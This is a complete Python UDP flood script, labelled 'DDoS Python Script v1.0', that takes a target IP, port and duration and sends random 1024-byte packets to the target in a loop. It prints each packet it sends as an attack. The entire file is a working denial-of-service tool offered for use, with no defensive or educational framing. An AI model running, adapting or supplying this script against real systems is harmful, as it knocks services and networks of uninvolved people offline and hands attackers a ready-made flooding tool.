import sys
import socket
import random
import time

def usage():
    print("\n\t\t   DDoS Python Script v1.0")
    print("\t\t----------------------------------")
    print("\t\t   python ddos.py <ip> <port> <duration>")
    print("\t\t----------------------------------")
    print("\t\t       Coded By: Mr.Rathank")
    print("\t\t----------------------------------")

def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1024)  # Generate random packet data
    timeout = time.time() + duration  # End time
    sent = 0

    while time.time() < timeout:
        client.sendto(bytes_data, (victim, vport))
        sent += 1
        print(f"Attacking {victim}, sent {sent} packets to port {vport}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        usage()
        sys.exit(1)

    try:
        target_ip = str(sys.argv[1])
        target_port = int(sys.argv[2])
        attack_duration = int(sys.argv[3])

        print(f"Starting attack on {target_ip}:{target_port} for {attack_duration} seconds...")
        flood(target_ip, target_port, attack_duration)

    except ValueError:
        print("Error: Port and duration must be integers.")
        sys.exit(1)
